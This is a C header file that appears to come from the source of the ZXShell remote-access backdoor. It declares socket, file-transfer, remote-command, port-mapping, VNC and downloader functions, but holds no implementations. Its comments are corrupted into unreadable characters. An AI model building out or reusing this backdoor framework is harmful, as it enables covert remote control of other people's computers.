

#ifndef TCOMMON_H
#define TCOMMON_H

#include <windows.h>
#include <stdio.h>
#include "..\zxsCommon\link.h"
#include "ShellList.h"

#include "..\zxsCommon\CommandLineToArgvA.h"
#include "Debug.h"
#include "..\zxsCommon\RegEdit.h"
#include "..\zxsCommon\zxsWinAPI.h"
#include "..\zxsCommon\SpamCode.h"


#define MAXBUFSIZE 8192
#define WM_SOCKET (WM_USER+1)


#define MAX_CMD_LEN     32+MAX_PATH
#define MAX_NAME_LEN    128
#define MAX_PWD_LEN     128
#define MAX_RESP_LEN    1024
#define MAX_REQ_LEN     256
#define MAX_ADDR_LEN    32

#define	PASVMODE		0x01
#define	PORTMODE		0x02
#define	FXPMODE			0x04


#define action_Online	0
#define action_FileMG	1
#define action_WinVNC	3
#define action_PORTMAP	4
#define action_GETCMD	5
#define action_RDSRV	6
#define action_CAPSRV	7


#define KEY_BUFF            256
#define MAX_BUFF            1024*8

typedef struct _FILE_INFO{
    TCHAR           szFileName[MAX_PATH];
    DWORD           dwFileAttributes; 
    FILETIME        ftCreationTime; 
    FILETIME        ftLastAccessTime; 
    FILETIME        ftLastWriteTime; 
    DWORD           nFileSizeHigh; 
    DWORD           nFileSizeLow; 
} FILE_INFO, *LPFILE_INFO;


int _xstricmp(const char *str1, const char *str2);

void err_display(SOCKET Socket, char *msg, bool sendimmediately);

int SendMessage(SOCKET Socket, const char *fmt, ...);

BOOL IsAbort(SOCKET s, char *Cmd);

BOOL IP_Filter(SOCKET s, const char *AllowedIP, const char *DeniedIP);
BOOL Is_IP_in_range(char *sourceIP, char *destIP);
BOOL Is_dwIP_in_range(char *sourceIP, char *destIP);
BOOL Is_szIP_in_range(char *sourceIP, char *destIP);
DWORD getsockdwIP(SOCKET s);
WORD getsockport(SOCKET s);
char *GetPath(char *FullPath, char *Path);
//const char *TakeOutStringByChar(IN const char *Source, OUT char *Dest, int buflen, char ch);
const char *TakeOutStringByChar(IN const char *Source, OUT char *Dest, int buflen, char ch, bool space=false);

int FormatPathString(char *Source, char *Dest, int buflen, bool flag);


char *GetInetIP(char *OutIP);
SOCKET CreateUDPSocket(DWORD *LPIP, WORD *LPPort);
int UDPSend(SOCKET s, char *buff, int nBufSize, DWORD dwIP, WORD wPort);
DWORD TransmitData(LPVOID lparam);

BOOL TurnOnKeepAlive(SOCKET s, int time, int interval);//in shellmain.cpp
int SetTimeOut(SOCKET Socket,int nTimeOut);
int RecvMessage(SOCKET Socket, char *RecvBuf, int DataLen, int TimeOut_sec);
int DataSend(SOCKET s, char *DataBuf, int DataLen);//��DataBuf�е�DataLen���ֽڷ���sȥ
char *DNS(char *HostName);
SOCKET ConnectHost(DWORD dwIP, WORD wPort);//����ָ��IP�Ͷ˿�
SOCKET ConnectHost(char *szIP, WORD wPort);

SOCKET ieConnectHost(char *szIP, WORD wPort);//////ͨ��IE����
SOCKET ieConnectHost(DWORD dwIP, WORD wPort);

SOCKET CreateSocket(char *szIP, WORD wPort);
SOCKET CreateSocket(DWORD dwIP, WORD wPort);//��dwIP�ϰ�wPort�˿�
SOCKET CreateTmpSocket(WORD *wPort);//����һ����ʱ���׽���,ָ��wPort��ô�������ʱ�˿�
BOOL InitSock();
SOCKET DoAccept(SOCKET s, int nTimeOut);
void ForceCloseSocket(SOCKET s);

bool SetSocketToBlocking(SOCKET s);
bool Send_ACK(SOCKET Socket, BYTE b);
bool Recv_ACK(SOCKET Socket, BYTE b);
int GetCmdLine(SOCKET Socket, char *RecvBuf, int BufSize, int nTimeOut);
int SetTimeOut(SOCKET Socket,int nTimeOut);
int DataSend(SOCKET s, char *DataBuf, int DataLen);
int RecvMessage(SOCKET Socket, char *RecvBuf, int DataLen, int TimeOut_sec);

int SendFileData(SOCKET Socket, char *LocalFile, __int64 StartPos);
BOOL RecvFileData(SOCKET Socket, char *LocalFile, __int64 FileSize);

//download, defined in WGet.cpp
int iGetFile(SOCKET Socket, char *Server, char *Local, DWORD Flag);

#endif